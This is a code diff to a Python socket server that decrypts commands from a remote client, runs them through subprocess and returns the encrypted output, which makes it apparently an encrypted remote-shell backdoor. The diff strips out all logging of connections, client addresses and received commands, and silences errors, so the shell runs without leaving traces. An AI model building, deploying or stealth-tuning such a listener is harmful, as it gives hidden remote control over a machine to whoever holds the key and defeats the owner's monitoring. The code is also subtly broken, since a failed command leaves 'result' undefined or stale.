@@ -26,12 +26,8 @@ def server_program():
         # up cron jobs that run regularly
         exit()
     
-    
-    print('waiting for connection')
     conn, address = server_socket.accept()  # accept new connection
-    print("Connection from: " + str(address))
     curr_time = time.localtime()
-    print('at: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
 
     while True:
         # receive data stream. it won't accept data packet greater than 1024 bytes
@@ -42,22 +38,18 @@ def server_program():
         # before running commands auth using AES
         # we need a private key
         data = str(f.decrypt(data).decode())
-
-        print(data)
-        print("from connected user: " + data)
         command = data
         
         try:
             result = subprocess.run(command.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             
         except :
-            print("Something Messed Up")
+            pass
             # send data to the client
         res = f.encrypt(result.stdout)
         conn.send(res)
     conn.close()  # close the connection
     curr_time = time.localtime()
-    print('current time: ', curr_time.tm_hour, ':',curr_time.tm_min, ':', curr_time.tm_sec)
             
 
 if __name__ == '__main__':
